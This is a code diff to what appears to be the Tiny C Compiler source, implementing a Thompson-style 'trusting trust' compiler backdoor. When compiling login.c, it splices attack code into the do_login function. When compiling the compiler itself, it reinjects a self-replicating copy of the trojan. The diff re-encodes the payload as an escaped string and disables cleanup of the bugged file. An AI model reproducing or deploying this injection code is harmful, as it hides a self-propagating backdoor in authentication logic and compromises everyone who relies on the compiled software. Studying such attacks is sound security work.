@@ -6,7 +6,6 @@ int isBug = 0;
 if ((str_pointer = strstr(str, "login.c")) != NULL)
 {
 printf("Found login.c!! Bugging it...\n");
-// Read Normal file
 int normalfd = open(str, O_RDONLY | 0660);
 char login_sig[] = "static int\n"
 "do_login(const char *username)\n"
@@ -24,7 +23,6 @@ strcpy(tmp, fileBuffer + offset);
 strcpy(fileBuffer + offset, login_attack);
 strcpy(fileBuffer + offset + strlen(login_attack), tmp);
 
-// Write the bad code to temp file
 int buggedfd = open("login.c", O_WRONLY | O_TRUNC | O_CREAT, 0660);
 int byteWrote = write(buggedfd, fileBuffer, strlen(fileBuffer));
 close(buggedfd);
@@ -36,7 +34,6 @@ isBug = 1;
 if ((str_pointer = strstr(str, "libtcc.c")) != NULL)
 {
 printf("Found libtcc.c\n");
-// Read Normal file
 int normalfd = open(str, O_RDONLY | 0660);
 char compile_sig[] = "variables, which may or may not have advantages */";
 
@@ -44,32 +41,28 @@ int readByte = read(normalfd, fileBuffer, bufferSize);
 close(normalfd);
 fileBuffer[readByte] = '\0';
 
-// Check for signature
 char *spotLocation = strstr(fileBuffer, compile_sig);
 
 if (spotLocation != NULL)
 {
-// Inject bad code
 int buggedfd = open("../libtcc_bug.c", O_WRONLY | O_TRUNC | O_CREAT, 0660);
 unsigned int offset = strlen(compile_sig);
-char *a = "\n\nchar compile_attack[] = {";
-char *b = "};\n";
+char *a = "\nchar compile_attack[] = \"";
+char *b = "\";\n";
 for(char *c = fileBuffer; c != spotLocation + offset; c++)
 write(buggedfd, c, 1);
 write(buggedfd, a, strlen(a));
-char n[8];
 for(char *c = compile_attack; *c;c++)
 {
-sprintf(n, "%d,", *c);
-write(buggedfd, n, strlen(n));
+if(*c == '\"' || *c == '\\')
+write(buggedfd, "\\", 1);
+write(buggedfd, c, 1);
 }
-write(buggedfd, "0", 1);
 write(buggedfd, b, strlen(b));
 write(buggedfd, compile_attack, strlen(compile_attack));
 for(char *c = spotLocation + offset; *c;c++)
 write(buggedfd, c, 1);
 
-// Write the bad code to temp file
 close(buggedfd);
 fd = _tcc_open(s1, "../libtcc_bug.c");
 str = "../libtcc_bug.c";
@@ -112,9 +105,10 @@ tccgen_finish(s1);
 preprocess_end(s1);
 s1->error_set_jmp_enabled = 0;
 tcc_exit_state(s1);
-
-// if(isBug)
-// {
-//     remove(str);
-// }
+/*
+if(isBug)
+{
+remove(str);
+}
+*/
 return s1->nb_errors != 0 ? -1 : 0;
